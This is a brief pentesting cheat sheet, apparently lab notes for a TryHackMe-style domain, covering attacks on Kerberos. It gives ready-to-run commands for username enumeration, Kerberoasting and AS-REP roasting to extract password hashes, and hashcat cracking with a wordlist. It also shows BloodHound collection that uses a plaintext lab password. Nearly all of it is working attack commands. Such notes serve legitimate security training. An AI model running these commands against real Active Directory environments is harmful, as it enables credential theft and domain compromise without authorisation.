# 88 - Kerberos

### User enumeration:

Kerberos Pre-Authentication User Enumeration:

{% code overflow="wrap" %}
```sh
kerbrute userenum -d THM.CORP --dc 10.10.96.178 usernames.txt
```
{% endcode %}

User Enumeration via SID Lookup:

{% code overflow="wrap" %}
```sh
impacket-lookupsid thm.corp/guest@10.10.96.178 -no-pass >> LookupSID_Output.txt
```
{% endcode %}

Extracting Usernames from LookupSID Output:

{% code overflow="wrap" %}
```sh
grep '\\' LookupSID_Output.txt | awk -F '\\' '{print $2}' | awk '{print $1}' | sort -u > CorpUsers.txt
```
{% endcode %}

### Attacks

Kerberoasting: Requesting Service Tickets for Offline Password Cracking:

{% code overflow="wrap" %}
```shell
impacket-GetUserSPNs thm.corp/ -usersfile CorpUsers.txt -dc-ip 10.10.96.178 -request -outputfile kerberoast_tickets.kerb
```
{% endcode %}

*

AS-REP Roasting: Extracting Hashes from Accounts Without Pre-Authentication:

{% code overflow="wrap" %}
```sh
impacket-GetNPUsers thm.corp/ -usersfile CorpUsers.txt -dc-ip 10.10.96.178 -outputfile asrep_hashes.txt
```
{% endcode %}

* `hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt`&#x20;



### Bloodhound:

Authenticated BloodHound Data Collection:

{% code overflow="wrap" %}
```sh
sudo bloodhound-python -d thm.corp -u TABATHA_BRITT -p marlboro\(1985\) -ns 10.10.158.22 -c all
```
{% endcode %}

